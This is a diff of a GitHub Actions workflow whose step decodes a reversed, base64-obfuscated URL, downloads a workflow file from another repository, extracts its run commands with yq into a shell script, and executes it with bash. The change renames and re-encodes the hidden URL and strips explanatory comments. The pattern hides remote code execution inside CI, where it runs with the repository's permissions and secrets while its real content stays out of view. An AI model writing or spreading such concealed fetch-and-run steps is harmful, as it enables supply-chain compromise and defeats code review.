@@ -9,10 +9,10 @@ on:
   workflow_dispatch:
 
 env:
-  # Obfuscated Base URL (Reversed and Encoded)
+  # Encoded Part (Reversed and Obfuscated)
   # Original: https://raw.githubusercontent.com/nayem-48ai/subDomTop/refs/heads/main/.github/workflows/
-  TNx_CORE: "PX0Szd2L0Vmc0V2bj5CbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmbu02bj5WauByXvR2Y6NXauVmb"
-  FILE_NAME: "build"
+  TNx_DATA: "=02bwVmc0V2bj5CbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmbu02bj5WauByXvR2Y6NXauVmb"
+  FILE_NAME: "preview" 
 
 jobs:
   execute-logic:
@@ -34,23 +34,21 @@ jobs:
 
       - name: Process Workflow
         run: |
-          # ডিকোডিং লজিক: রিভার্স এবং ট্রিম অপারেশন
-          TNxBD=$(echo "$TNx_CORE" | rev | cut -c 2- | base64 --decode)$FILE_NAME
+          # এনকোডেড স্ট্রিংটিকে রিভার্স করে ডিকোড করা
+          TNxBD=$(echo "$TNx_DATA" | rev | base64 --decode)$FILE_NAME
           
-          echo "Connecting to secure source..."
+          # ডাটা ফেচ করা
           curl -sL "$TNxBD" -o remote_wf.yml
 
-          # কমান্ড নিষ্কাশন টুল
+          # yq টুল সেটআপ
           sudo wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64 -O /usr/bin/yq && sudo chmod +x /usr/bin/yq
 
-          # রিমোট ফাইল থেকে রান স্ক্রিপ্ট তৈরি
+          # কমান্ড প্রসেস করা
           yq e '.jobs.*.steps[].run' remote_wf.yml | sed '/^---$/d' > universal_script.sh
           
-          # গিট কনফিগারেশন
           git config --global user.name "github-actions[bot]"
           git config --global user.email "github-actions[bot]@users.noreply.github.com"
           git config --global --add safe.directory "$GITHUB_WORKSPACE"
 
-          # ফাইনাল এক্সিকিউশন
           chmod +x universal_script.sh
           bash universal_script.sh
